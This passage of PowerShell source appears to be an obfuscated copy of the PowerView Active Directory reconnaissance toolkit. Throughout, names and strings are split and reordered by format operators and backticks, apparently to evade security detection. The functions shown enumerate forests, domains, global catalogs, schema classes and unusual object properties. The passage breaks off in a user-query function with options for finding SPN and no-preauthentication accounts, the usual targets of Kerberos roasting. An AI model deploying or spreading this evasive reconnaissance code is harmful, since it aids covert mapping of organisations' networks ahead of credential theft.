            &("{2}{3}{0}{1}"-f 'o','se','W','rite-Verb') ("{9}{10}{15}{13}{2}{14}{7}{6}{8}{0}{1}{12}{4}{3}{5}{11}" -f ' f','or ','rest] Using ','or','-F','es','ate c','n','redentials','[G','et','t','Get','Fo','alter','-')

            if (${P`SbouNDPa`Ra`mETERS}[("{1}{0}{2}"-f'ores','F','t')]) {
                ${TAr`Getf`or`EST} = ${fO`R`eST}
            }
            else {
                
                ${T`AR`GetF`OREst} = ${C`REDEnTI`AL}.("{2}{0}{3}{1}"-f'etNet','al','G','workCredenti').Invoke()."DoMa`in"
                &("{2}{0}{1}" -f 'rite-V','erbose','W') ('[Get-Fo'+'re'+'st'+'] '+'Ext'+'r'+'acted '+'dom'+'a'+'in '+"'$Forest' "+'fr'+'om '+'-Cre'+'den'+'tial')
            }

            ${fO`RestcOnTE`xT} = &("{2}{1}{0}" -f 'ect','-Obj','New') ("{5}{9}{2}{3}{7}{8}{0}{4}{6}{1}" -f'ector','xt','y','Services.A','y.Dir','System.Direct','ectoryConte','cti','veDir','or')(("{2}{0}{1}" -f 'o','rest','F'), ${TARgE`TF`oResT}, ${c`RE`de`Ntial}."USERN`A`me", ${crEDeN`T`Ial}.("{1}{3}{4}{2}{0}"-f'al','GetNet','i','w','orkCredent').Invoke()."p`A`SSWoRd")

            try {
                ${FoR`EsT`oBj`ECT} =   (ITeM ("{1}{0}{3}{4}{2}"-f 'a','v','VA','RiaB','le:HW') )."val`Ue"::("{3}{2}{0}{1}" -f 'e','st','For','Get').Invoke(${f`o`R`ESTcoNT`EXT})
            }
            catch {
                &("{3}{2}{1}{0}"-f 'e','Verbos','ite-','Wr') ('[Get'+'-'+'Forest] '+'T'+'he '+'s'+'pec'+'ified '+'forest'+' '+"'$TargetForest' "+'do'+'es '+'n'+'ot '+'e'+'xist, '+'c'+'oul'+'d '+'n'+'ot '+'b'+'e '+'c'+'o'+'ntacted'+', '+'th'+'ere '+('isn'+'{0'+'}t ')-F [char]39+'a'+'n '+'existi'+'ng '+'t'+'rust'+', '+'or'+' '+'th'+'e '+'sp'+'e'+'cified '+'c'+'red'+'enti'+'als '+'a'+'re '+'inva'+'lid:'+' '+"$_")
                ${nu`LL}
            }
        }
        elseif (${P`Sboun`D`paR`Am`Eters}[("{0}{1}"-f 'F','orest')]) {
            ${ForeS`Tcont`exT} = &("{1}{2}{0}" -f'ect','Ne','w-Obj') ("{8}{9}{2}{10}{11}{0}{5}{12}{3}{13}{14}{4}{7}{15}{1}{6}" -f 'o','to','e','c','Director','rySer','ryContext','y.Dir','Sys','t','m.Di','rect','vi','es.Activ','e','ec')(("{0}{1}"-f 'Fore','st'), ${FOR`e`st})
            try {
                ${F`OR`eSt`obj`eCT} =   (vARiAbLe  ("hwV"+"A")  )."va`lue"::("{0}{1}"-f 'Ge','tForest').Invoke(${fo`ReSTCoN`T`Ext})
            }
            catch {
                &("{3}{1}{2}{4}{0}" -f 'e','rit','e-Verb','W','os') ('[Ge'+'t-'+'Fores'+'t] '+'Th'+'e '+'sp'+'ecif'+'ied'+' '+'for'+'est '+"'$Forest' "+'do'+'es '+'n'+'ot '+'exist,'+' '+'c'+'o'+'uld '+'no'+'t '+'be'+' '+'co'+'nt'+'acte'+'d, '+'or'+' '+'there'+' '+('isn'+'v8at ')."rE`pl`ACe"('v8a',[sTRINg][cHAR]39)+'an'+' '+'existi'+'n'+'g '+'trust'+': '+"$_")
                return ${N`UlL}
            }
        }
        else {
            
            ${f`O`REStoBj`ECt} =   (  diR  ("{1}{2}{0}{3}" -f'IaBLE:','V','aR','hwva')  )."Va`Lue"::("{0}{4}{3}{2}{1}"-f 'Ge','est','r','rentFo','tCur').Invoke()
        }

        if (${fORe`StO`BjE`CT}) {
            
            if (${psboUNDpa`Ram`et`e`Rs}[("{0}{1}{2}" -f'Cre','dentia','l')]) {
                ${FO`Res`TsiD} = (&("{3}{0}{1}{2}" -f'et-Domai','nUs','er','G') -Identity ("{0}{1}" -f 'krb','tgt') -Domain ${FORESTO`B`JeCT}."r`OoTDoM`AIn"."na`me" -Credential ${C`R`EDen`TiAl})."o`Bj`Ectsid"
            }
            else {
                ${F`O`RESTsID} = (&("{1}{2}{0}"-f 'User','Get-Do','main') -Identity ("{1}{2}{0}"-f'gt','k','rbt') -Domain ${fOr`E`S`TOBJecT}."ro`O`TDoMAiN"."na`ME")."oB`J`EctsID"
            }

            ${pa`RTS} = ${F`O`Re`sTSiD} -Split '-'
            ${FORE`S`Ts`ID} = ${Pa`RtS}[0..$(${PA`R`TS}."leN`G`Th"-2)] -join '-'
            ${FO`ResT`obje`Ct} | &("{2}{0}{1}"-f 'dd','-Member','A') ("{3}{0}{2}{1}" -f 'oteProp','y','ert','N') ("{0}{2}{1}" -f 'Root','d','DomainSi') ${Fo`Re`sTSId}
            ${FOR`EsT`oBJ`ect}
        }
    }
}


function get`-f`oRE`stDOMAiN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}" -f 'Sho','dProcess','PS','ul'}, '')]
    [OutputType({"{5}{10}{9}{7}{1}{6}{12}{3}{2}{11}{8}{4}{0}"-f'omain','ctorySe','tiveD','Ac','D','Syst','rvi','ire','ory.','.D','em','irect','ces.'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsiTiON = 0, valuefRomPiPeLIne = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`oR`esT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRED`EN`Tial} =   ( diR  ("{0}{3}{2}{1}"-f 'VAr','FN','Q','IaBlE:'))."v`AlUe"::"eM`PTy"
    )

    PROCESS {
        ${A`RGumEN`TS} = @{}
        if (${psbO`U`NdPa`R`AM`ETERS}[("{0}{1}"-f 'For','est')]) { ${Ar`gum`eNTS}[("{1}{0}"-f 't','Fores')] = ${F`Orest} }
        if (${ps`Bo`UndP`ARa`MeTE`Rs}[("{1}{0}{2}" -f'tia','Creden','l')]) { ${aRg`Ume`N`Ts}[("{0}{1}{2}"-f'Creden','t','ial')] = ${cReD`eNti`Al} }

        ${f`O`Re`stobjeCt} = &("{0}{1}{2}" -f 'G','et-Fore','st') @Arguments
        if (${F`ORES`T`obj`Ect}) {
            ${FO`REsToB`JEct}."D`o`maiNs"
        }
    }
}


function g`ET`-FoRe`STgL`oBAL`CatA`Log {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}" -f 'ss','PSSho','dProce','ul'}, '')]
    [OutputType({"{10}{8}{2}{6}{9}{0}{7}{5}{11}{3}{1}{4}{12}" -f'r','y.GlobalCat','rectoryServi','r','a','ct','ces.Acti','e','.Di','veDi','System','o','log'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItion = 0, vaLuefrOmpiPELiNE = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`OrEsT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDent`iAl} =   ( gEt-ChILDitem ("{3}{2}{1}{0}"-f'qFn','E:','aBl','VARi') )."VAl`Ue"::"eM`pTY"
    )

    PROCESS {
        ${A`RGUm`eNtS} = @{}
        if (${PsBOuN`D`p`ArameTeRS}[("{1}{0}" -f 't','Fores')]) { ${ARg`Um`entS}[("{0}{1}"-f 'Fore','st')] = ${for`e`st} }
        if (${ps`BOUnd`Par`AMe`TErS}[("{0}{1}{2}"-f 'Cr','edenti','al')]) { ${ARg`UmEN`Ts}[("{2}{1}{0}"-f'tial','en','Cred')] = ${cREDEN`T`iAL} }

        ${ForE`S`Tob`j`eCt} = &("{2}{0}{1}" -f't-For','est','Ge') @Arguments

        if (${fo`ReStobj`e`Ct}) {
            ${forEs`T`objE`cT}.("{2}{3}{0}{1}{6}{5}{4}"-f'l','lGlobalC','Fi','ndA','s','log','ata').Invoke()
        }
    }
}


function geT`-`For`esTs`CH`EMAClASs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{3}{1}{0}" -f'ess','oc','PSShould','r','P'}, '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(POsITION = 0, VALUefRoMPIPelIne = ${TR`UE})]
        [Alias({"{0}{1}"-f 'C','lass'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`LAssn`AME},

        [Alias({"{0}{1}" -f'Nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`ore`sT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`D`ENTial} =   (vArIaBlE  ('q'+'fN')  -VaLUeo)::"em`Pty"
    )

    PROCESS {
        ${ARGume`N`TS} = @{}
        if (${pSBou`NdP`A`R`AmEtErS}[("{2}{0}{1}" -f 'ores','t','F')]) { ${ARGuM`EN`TS}[("{2}{0}{1}"-f'e','st','For')] = ${fO`R`Est} }
        if (${psBOUNd`p`A`Ra`mete`RS}[("{1}{3}{2}{0}"-f'al','Cre','ti','den')]) { ${ar`GU`MEntS}[("{0}{2}{1}"-f 'Cr','ial','edent')] = ${cR`Ede`Ntial} }

        ${Fo`RE`sTobJeCT} = &("{1}{2}{0}"-f 'rest','Get-F','o') @Arguments

        if (${F`O`R`estObjEcT}) {
            if (${PsbO`UNDPAra`M`eterS}[("{2}{3}{0}{1}" -f'assN','ame','C','l')]) {
                ForEach (${targetcL`A`Ss} in ${C`lAs`SNamE}) {
                    ${F`oREsToB`JE`Ct}."sc`HEMA".("{2}{1}{0}{3}" -f 's','ndCla','Fi','s').Invoke(${tARgETC`l`A`sS})
                }
            }
            else {
                ${foreS`T`OBj`Ect}."sCH`e`mA".("{0}{2}{1}" -f'F','ses','indAllClas').Invoke()
            }
        }
    }
}


function FInD-DOMaINO`Bj`EcTpr`o`p`Er`Ty`oUtlIER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{4}{0}"-f'ss','PS','S','houldPro','ce'}, '')]
    [OutputType({"{2}{0}{3}{1}{4}" -f 'Pr','ut','PowerView.','opertyO','lier'})]
    [CmdletBinding(defaULTPaRAmeTerSeTname = {"{1}{0}{2}" -f's','Cla','sName'})]
    Param(
        [Parameter(POsItION = 0, MANDatOrY = ${T`Rue}, paRametersEtNAme = "cLa`Ssna`mE")]
        [Alias({"{0}{1}"-f'Cla','ss'})]
        [ValidateSet({"{1}{0}"-f'er','Us'}, {"{0}{1}" -f'Gro','up'}, {"{0}{1}"-f'Com','puter'})]
        [String]
        ${C`la`s`snAme},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${rEFE`Re`Nc`E`PRO`pertYS`eT},

        [Parameter(VAlUeFrOmpIpeLINe = ${T`RuE}, ManDatORy = ${T`Rue}, PAraMeTERsETNamE = "reF`E`RENCe`o`BjECt")]
        [PSCustomObject]
        ${REF`E`R`EnCEo`BJE`ct},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'lter','Fi'})]
        [String]
        ${LdaPf`i`lTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'DS','Path','A'})]
        [String]
        ${Sear`ch`Ba`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}" -f 'Doma','l','ler','inContro'})]
        [String]
        ${S`erveR},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{0}{2}{1}"-f'OneL','el','ev'}, {"{1}{0}"-f 'ubtree','S'})]
        [String]
        ${s`EA`Rchscope} = ("{2}{1}{0}"-f 'ree','ubt','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`s`UltpaGE`sizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sEr`VErtime`lI`mIt},

        [Switch]
        ${TOMB`S`Tone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`DEN`T`iAL} =  (dIr ("{1}{2}{0}" -f 'N','VariaBL','e:Qf')  )."V`ALUe"::"Em`PtY"
    )

    BEGIN {
        ${U`SErr`eF`EREnCEPr`opER`TY`seT} = @(("{2}{1}{0}" -f 'nt','cou','admin'),("{2}{0}{3}{4}{1}" -f'un','ires','acco','t','exp'),("{0}{3}{1}{2}{4}" -f'badp','word','t','ass','ime'),("{1}{0}{2}" -f'wdcou','badp','nt'),'cn',("{1}{0}" -f'page','code'),("{2}{1}{0}" -f 'e','trycod','coun'),("{2}{1}{0}" -f 'iption','escr','d'), ("{1}{3}{0}{2}"-f 'lay','d','name','isp'),("{0}{1}{2}{3}"-f 'disti','n','guis','hedname'),("{3}{0}{2}{1}{4}" -f 'ro','atio','pag','dscorep','ndata'),("{1}{0}{2}"-f 'ennam','giv','e'),("{3}{0}{2}{1}"-f 'nst','cetype','an','i'),("{0}{1}{2}{3}{6}{4}{5}"-f'iscri','ti','c','als','mo','bject','yste'),("{1}{0}{2}" -f'a','l','stlogoff'),("{1}{0}{2}"-f't','las','logon'),("{2}{1}{0}{3}" -f'gontimestam','o','lastl','p'),("{1}{0}{3}{2}" -f 'u','locko','time','t'),("{0}{1}{2}"-f 'logo','n','count'),("{0}{1}" -f 'mem','berof'),("{1}{0}{3}{6}{2}{5}{4}"-f's-supporte','msd','pt','denc','s','iontype','ry'),("{1}{0}"-f'ame','n'),("{2}{1}{4}{0}{3}" -f 'ego','tca','objec','ry','t'),("{0}{1}{2}{3}" -f 'objectc','la','s','s'),("{2}{0}{1}" -f 'ec','tguid','obj'),("{1}{2}{0}"-f'd','obje','ctsi'),("{2}{1}{0}{3}"-f'ro','g','primary','upid'),("{1}{2}{0}"-f 'dlastset','p','w'),("{1}{2}{0}{3}"-f'a','samac','countn','me'),("{0}{1}{2}" -f'sama','ccoun','ttype'),'sn',("{0}{4}{1}{2}{3}" -f'user','ou','n','tcontrol','acc'),("{2}{3}{1}{0}"-f 'me','alna','userpri','ncip'),("{1}{3}{2}{0}"-f 'anged','u','ch','sn'),("{2}{1}{0}"-f'ed','sncreat','u'),("{1}{2}{0}"-f 'd','whe','nchange'),("{2}{0}{1}" -f 're','ated','whenc'))

        ${g`R`oup`RefereN`cepRo`pErTy`seT} = @(("{0}{1}{2}" -f'ad','mi','ncount'),'cn',("{2}{1}{0}" -f 'on','pti','descri'),("{1}{5}{0}{3}{2}{4}"-f 'n','di','he','guis','dname','sti'),("{5}{0}{3}{2}{1}{6}{4}" -f 'e','n','tio','propaga','ata','dscor','d'),("{1}{0}{2}" -f'yp','groupt','e'),("{3}{1}{0}{2}" -f 'c','an','etype','inst'),("{2}{4}{0}{3}{1}" -f 'iticalsy','bject','isc','stemo','r'),("{1}{0}"-f 'r','membe'),("{1}{2}{0}"-f 'f','membe','ro'),("{1}{0}"-f 'ame','n'),("{3}{0}{1}{2}" -f 'a','tego','ry','objectc'),("{1}{0}{2}"-f 'ject','ob','class'),("{0}{1}{2}"-f 'o','bjectgu','id'),("{1}{0}" -f'ctsid','obje'),("{1}{0}{2}{3}"-f 'ama','s','cc','ountname'),("{2}{0}{1}{3}" -f'o','untt','samacc','ype'),("{2}{1}{0}" -f'lags','emf','syst'),("{1}{2}{0}" -f 'ed','usnch','ang'),("{0}{2}{1}"-f'us','ated','ncre'),("{1}{2}{0}"-f 'nged','whe','ncha'),("{2}{0}{1}" -f 'cre','ated','when'))

        ${coMPU`Terr`EfEr`en`c`ep`RO`p`eRTySET} = @(("{2}{1}{0}"-f 'es','ntexpir','accou'),("{1}{0}{2}{4}{3}"-f'ssw','badpa','o','time','rd'),("{0}{1}{2}"-f 'ba','dpwdcou','nt'),'cn',("{1}{2}{0}"-f'e','c','odepag'),("{1}{0}{2}"-f'n','cou','trycode'),("{3}{1}{0}{2}" -f 'ti','is','nguishedname','d'),("{0}{2}{1}" -f'dnsho','e','stnam'),("{0}{2}{3}{1}"-f'dscorep','iondata','ro','pagat'),("{2}{1}{0}{3}"-f'ancety','nst','i','pe'),("{1}{4}{5}{3}{0}{2}"-f'ical','i','systemobject','t','scr','i'),("{2}{1}{0}"-f 'f','astlogof','l'),("{1}{0}{2}" -f 'stl','la','ogon'),("{1}{2}{0}{3}"-f 'im','lastlo','gont','estamp'),("{4}{0}{3}{1}{2}"-f'o','flag','s','calpolicy','l'),("{1}{0}{2}"-f'un','logonco','t'),("{8}{2}{5}{4}{7}{3}{1}{6}{0}"-f'es','ncryptio','sds-s','e','pporte','u','ntyp','d','m'),("{0}{1}" -f 'n','ame'),("{0}{2}{1}" -f'object','ory','categ'),("{0}{1}{2}"-f'ob','jectcl','ass'),("{0}{2}{1}"-f'obj','ctguid','e'),("{0}{1}{2}" -f'objec','t','sid'),("{3}{0}{2}{1}" -f'e','m','ratingsyste','op'),("{2}{0}{5}{3}{1}{4}" -f'rati','ervice','ope','s','pack','ngsystem'),("{5}{3}{0}{1}{2}{4}"-f'stem','ve','r','ingsy','sion','operat'),("{3}{2}{0}{1}"-f'yg','roupid','r','prima'),("{1}{0}{2}" -f 'lastse','pwd','t'),("{2}{1}{0}{4}{3}"-f'accou','m','sa','tname','n'),("{0}{1}{2}{3}"-f'samacco','un','tt','ype'),("{3}{0}{2}{1}{4}" -f'ic','n','eprincipal','serv','ame'),("{0}{2}{1}{3}{4}" -f 'use','accoun','r','tc','ontrol'),("{2}{0}{3}{1}"-f 'nc','d','us','hange'),("{0}{2}{1}{3}" -f'us','r','nc','eated'),("{2}{0}{3}{1}"-f 'enc','ged','wh','han'),("{2}{3}{0}{1}" -f'cr','eated','wh','en'))

        ${SeA`R`chERAR`G`U`mENts} = @{}
        if (${P`sboUn`DP`ArameTe`Rs}[("{0}{1}" -f'Domai','n')]) { ${SEARc`H`eR`A`RgumE`NTS}[("{1}{0}"-f'main','Do')] = ${dom`AIN} }
        if (${P`SbOUnDpar`AM`E`Te`Rs}[("{1}{2}{0}" -f 'ter','L','DAPFil')]) { ${sEaRc`H`EraRg`UmEnTS}[("{3}{2}{0}{1}"-f 'lt','er','i','LDAPF')] = ${LDApFI`L`TER} }
        if (${Psbo`UN`dp`AraME`TeRS}[("{3}{2}{0}{1}"-f 'hB','ase','arc','Se')]) { ${SE`ARc`He`RA`RG`UMeNts}[("{1}{0}{2}"-f'as','SearchB','e')] = ${Se`Ar`Ch`BAsE} }
        if (${ps`BouNDP`AR`AmETE`RS}[("{0}{1}{2}" -f 'Ser','v','er')]) { ${Search`eraR`g`UmeNtS}[("{1}{0}"-f 'erver','S')] = ${s`e`RvEr} }
        if (${P`SbouN`DparaM`etERS}[("{1}{0}{2}{3}" -f'archSc','Se','op','e')]) { ${seArCH`er`ArGUMEn`TS}[("{2}{1}{3}{0}"-f 'chScope','e','S','ar')] = ${sear`CH`sC`ope} }
        if (${P`sboUndpa`RAme`TeRs}[("{1}{0}{2}"-f 'esultPag','R','eSize')]) { ${s`ea`RChER`Argume`NtS}[("{2}{0}{1}{3}" -f'esu','lt','R','PageSize')] = ${r`esuLt`P`A`GESIZE} }
        if (${pS`B`OuNDpARa`mE`Te`Rs}[("{1}{2}{3}{0}"-f 'Limit','S','e','rverTime')]) { ${SeaR`Ch`e`RA`RGUmEN`TS}[("{1}{3}{2}{0}"-f 't','Serv','i','erTimeLim')] = ${ServE`RT`i`mel`Imit} }
        if (${P`SBOuNDpA`RA`MEteRs}[("{1}{0}{2}"-f'ombs','T','tone')]) { ${s`E`ARCHERargu`Me`Nts}[("{2}{0}{1}"-f'o','ne','Tombst')] = ${t`oMB`StoNe} }
        if (${pS`BounDP`A`R`AMEt`ERs}[("{2}{1}{0}"-f'l','ia','Credent')]) { ${SEa`RCHeRA`Rg`UME`NTS}[("{0}{2}{1}"-f'Cr','tial','eden')] = ${crEDEn`T`iaL} }

        
        if (${p`S`BOu`NDpAr`AmEtERs}[("{1}{0}"-f 'n','Domai')]) {
            if (${psBOUn`Dpa`R`AMet`Ers}[("{1}{2}{0}" -f'ial','C','redent')]) {
                ${Ta`RgET`FORest} = &("{1}{2}{0}" -f 'Domain','Get','-') -Domain ${DOMA`IN} | &("{2}{1}{0}{3}" -f '-Ob','ct','Sele','ject') -ExpandProperty ("{0}{1}{2}" -f'F','or','est') | &("{1}{2}{0}{3}" -f 'Obj','Selec','t-','ect') -ExpandProperty ("{0}{1}"-f 'Nam','e')
            }
            else {
                ${TAR`G`E`TforeST} = &("{1}{3}{0}{2}" -f't-','G','Domain','e') -Domain ${DOm`A`In} -Credential ${Cr`EdENTI`AL} | &("{2}{1}{3}{0}" -f'ject','ct-','Sele','Ob') -ExpandProperty ("{2}{0}{1}" -f'e','st','For') | &("{3}{2}{4}{1}{0}" -f'bject','ct-O','l','Se','e') -ExpandProperty ("{0}{1}" -f'Na','me')
            }
            &("{2}{0}{1}" -f 'rite-','Verbose','W') ('['+'Find-Doma'+'i'+'n'+'Ob'+'jec'+'tP'+'rop'+'ert'+'y'+'Outlier] '+'Enume'+'ra'+'ted '+'fo'+'re'+'st '+"'$TargetForest' "+'for'+' '+'target'+' '+'domain'+' '+"'$Domain'")
        }

        ${scH`eM`Aar`Gum`ENts} = @{}
        if (${pSb`oUN`D`PARAmE`Te`Rs}[("{1}{2}{0}" -f 'ial','Cre','dent')]) { ${sche`mAa`RGuM`Ents}[("{1}{3}{2}{0}" -f'l','C','dentia','re')] = ${cREDe`N`TIaL} }
        if (${t`ARGEt`F`oReSt}) {
            ${SCh`eMAA`R`GumENts}[("{0}{1}"-f 'For','est')] = ${TARg`e`Tf`OreSt}
        }
    }

    PROCESS {

        if (${PSb`OuNDP`Aram`eTe`RS}[("{0}{1}{3}{2}"-f 'Re','fer','ropertySet','enceP')]) {
            &("{3}{2}{1}{0}"-f 'erbose','V','-','Write') ("{2}{8}{16}{6}{3}{18}{0}{11}{9}{7}{4}{12}{13}{14}{1}{19}{5}{10}{17}{15}"-f'inObj','ed -ReferencePr','[Fi','o','e','t','-D','li','n','yOut','y','ectPropert','r] U','sing spec','ifi','et','d','S','ma','oper')
            ${REfeR`en`ceObJeC`T`PROP`ertiES} = ${r`eF`erenCe`Pr`o`peRt`Yset}
        }
        elseif (${PsBOU`NDP`ARA`m`ET`eRS}[("{4}{1}{3}{0}{2}" -f 'nceOb','er','ject','e','Ref')]) {
            &("{2}{0}{1}" -f 't','e-Verbose','Wri') ("{15}{4}{7}{1}{9}{26}{12}{13}{18}{2}{17}{10}{25}{29}{16}{28}{0}{3}{22}{20}{27}{6}{21}{14}{5}{24}{8}{11}{19}{23}"-f'y names fr','ma','Outlier','om','D','r','o','o','n','inO',' ','ce prope','tPr','ope',' as the ','[Find-','op',']','rty','rty s','e',' use',' -Referenc','et','efere','Extractin','bjec','Object t','ert','g pr')
            ${Ref`erEnC`eo`BJe`cT`PROpeRtI`Es} = &("{3}{0}{2}{1}"-f 'et-','ber','Mem','G') -InputObject ${R`efeREnCEO`BjeCT} -MemberType ("{0}{1}{2}" -f'Note','Proper','ty') | &("{2}{1}{0}{3}"-f't','lec','Se','-Object') -Expand ("{1}{0}" -f 'ame','N')
            ${ReferENCEO`BJEcT`clA`ss} = ${reFeReNC`e`O`BJe`cT}."Ob`jE`C`TclAss" | &("{0}{1}{4}{3}{2}" -f 'Selec','t','ject','b','-O') -Last 1
            &("{3}{0}{1}{2}" -f 'rite-','Ver','bose','W') ('[Fi'+'nd-'+'Do'+'m'+'ain'+'Obje'+'c'+'tPr'+'ope'+'rtyOutlier] '+'C'+'alculated'+' '+'Ref'+'erenceObjec'+'tCl'+'ass '+': '+"$ReferenceObjectClass")
        }
        else {
            &("{0}{2}{1}" -f'Write-Verb','e','os') ('[Find-'+'D'+'omainOb'+'je'+'ctPropert'+'yOut'+'lier] '+'U'+'sing'+' '+'th'+'e '+'default'+' '+'r'+'ef'+'eren'+'ce '+'proper'+'t'+'y '+'s'+'et '+'fo'+'r '+'the'+' '+'obj'+'ec'+'t '+'clas'+'s '+"'$ClassName'")
        }

        if ((${Cl`AsS`NAme} -eq ("{1}{0}" -f'ser','U')) -or (${r`eFeREnC`E`oBjE`ctC`Lass} -eq ("{1}{0}"-f 'ser','U'))) {
            ${Ob`jEc`TS} = &("{0}{2}{3}{1}"-f'Ge','mainUser','t-D','o') @SearcherArguments
            if (-not ${RE`FEr`enCEoBJect`pr`oPEr`T`ies}) {
                ${refE`R`ENcEObJEC`TP`ROP`Erties} = ${Use`R`ReFerE`NC`ep`Rop`ERtYSet}
            }
        }
        elseif ((${claS`SN`Ame} -eq ("{0}{1}"-f'Gr','oup')) -or (${ReF`eRE`NcEObJ`ec`TClAsS} -eq ("{0}{1}" -f 'G','roup'))) {
            ${o`BJec`Ts} = &("{3}{1}{2}{0}"-f 'mainGroup','-D','o','Get') @SearcherArguments
            if (-not ${rE`F`ER`enCeO`B`jecTPrOp`E`RtI`es}) {
                ${RefErEN`cE`oB`j`ectPropErTIES} = ${gROupreFEr`eN`C`EPRo`p`ERTYS`ET}
            }
        }
        elseif ((${cL`As`snAme} -eq ("{2}{0}{1}" -f'mpute','r','Co')) -or (${reFE`R`EN`cEOBjE`c`TCla`Ss} -eq ("{0}{1}" -f 'Comput','er'))) {
            ${O`BjEC`Ts} = &("{5}{2}{3}{0}{1}{4}"-f 'mainCompu','te','et-D','o','r','G') @SearcherArguments
            if (-not ${refe`R`EncEObj`ect`ProPeR`T`IES}) {
                ${R`EfEREnCeO`BjECTpR`OpER`Ti`Es} = ${co`mP`UTeRReFeRe`NCEprOPErt`Y`sEt}
            }
        }
        else {
            throw ('[Fi'+'n'+'d'+'-Do'+'m'+'ainO'+'bjectPrope'+'rtyOu'+'t'+'lier]'+' '+'Invali'+'d '+'class'+': '+"$ClassName")
        }

        ForEach (${OB`jecT} in ${oB`je`CtS}) {
            ${Ob`JectPr`oPeR`TIES} = &("{1}{0}{2}" -f '-Me','Get','mber') -InputObject ${obJe`cT} -MemberType ("{1}{0}{2}" -f 'rt','NotePrope','y') | &("{2}{1}{0}"-f'ct','-Obje','Select') -Expand ("{1}{0}"-f 'me','Na')
            ForEach(${obJe`CTprO`pE`RTY} in ${oB`JeCtproPe`R`TI`eS}) {
                if (${r`ef`ER`EN`C`EObjE`cTpR`OpErT`ies} -NotContains ${oBj`ECtpR`OP`e`RtY}) {
                    ${o`UT} = &("{0}{2}{3}{1}" -f 'N','ject','ew-O','b') ("{1}{0}{2}" -f'Obj','PS','ect')
                    ${o`UT} | &("{3}{1}{0}{2}"-f'Me','d-','mber','Ad') ("{2}{1}{0}" -f'y','otepropert','N') ("{3}{0}{2}{1}" -f 'n','ame','tN','SamAccou') ${Ob`j`ECT}."S`AmaC`COu`NTNaME"
                    ${O`UT} | &("{2}{1}{0}" -f'ber','dd-Mem','A') ("{0}{3}{1}{2}" -f 'N','rope','rty','otep') ("{2}{0}{1}" -f'ope','rty','Pr') ${O`BJE`cTpROPE`RTy}
                    ${o`Ut} | &("{1}{0}{2}" -f'-Mem','Add','ber') ("{1}{2}{0}" -f'rty','Note','prope') ("{1}{0}" -f 'e','Valu') ${objE`ct}.${o`B`jE`cTPrO`PeRTy}
                    ${o`UT}."Pso`Bj`Ect"."TYpe`NA`MeS".("{0}{1}" -f'I','nsert').Invoke(0, ("{3}{1}{4}{2}{5}{0}" -f 'w.PropertyOutlier','r','i','Powe','V','e'))
                    ${o`UT}
                }
            }
        }
    }
}








function g`ET-DO`maIn`UseR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{5}{6}{1}{2}{0}{4}" -f'm','ared','VarsMoreThanAssign','P','ents','SUseD','ecl'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}"-f 'PS','Should','Process'}, '')]
    [OutputType({"{3}{2}{0}{1}" -f'ew.','User','i','PowerV'})]
    [OutputType({"{2}{0}{1}{3}" -f '.','U','PowerView','ser.Raw'})]
    [CmdletBinding(deFaUltPARameTerSetNaMe = {"{3}{1}{0}{2}" -f 'wDelegat','lo','ion','Al'})]
    Param(
        [Parameter(POsItiOn = 0, VALUeFroMpIpeLINE = ${tr`Ue}, VAluEFrompIpEliNebyPROPerTYNAmE = ${t`RUE})]
        [Alias({"{0}{1}{2}{3}"-f'Distin','guish','edN','ame'}, {"{1}{2}{0}" -f'tName','SamAc','coun'}, {"{1}{0}" -f'me','Na'}, {"{3}{0}{4}{1}{2}"-f'nguish','dN','ame','MemberDisti','e'}, {"{0}{2}{1}"-f 'Memb','Name','er'})]
        [String[]]
        ${id`eNt`iTY},

        [Switch]
        ${S`pn},

        [Switch]
        ${Ad`MI`NC`Ount},

        [Parameter(PaRAMETeRSetNAME = "A`LLOWdELegaT`ion")]
        [Switch]
        ${alL`o`W`DELegaTi`oN},

        [Parameter(pARaMETErsETnaMe = "dISA`Llo`WDe`lEgatiON")]
        [Switch]
        ${D`i`S`ALlOWdE`lEg`ATI`On},

        [Switch]
        ${trUS`Tedt`OA`U`Th},

        [Alias({"{4}{3}{1}{0}{5}{2}" -f'eauthN','berosPr','uired','r','Ke','otReq'}, {"{1}{2}{0}" -f 'Preauth','N','o'})]
        [Switch]
        ${p`RE`AU`THnoTrEquiRED},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Doma`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fi','lter'})]
        [String]
        ${lD`APF`I`Lter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`RoP`ERT`IES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'P','ath','ADS'})]
        [String]
        ${s`EArC`hBAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}"-f 'tr','inCon','Doma','oller'})]
        [String]
        ${S`ERveR},

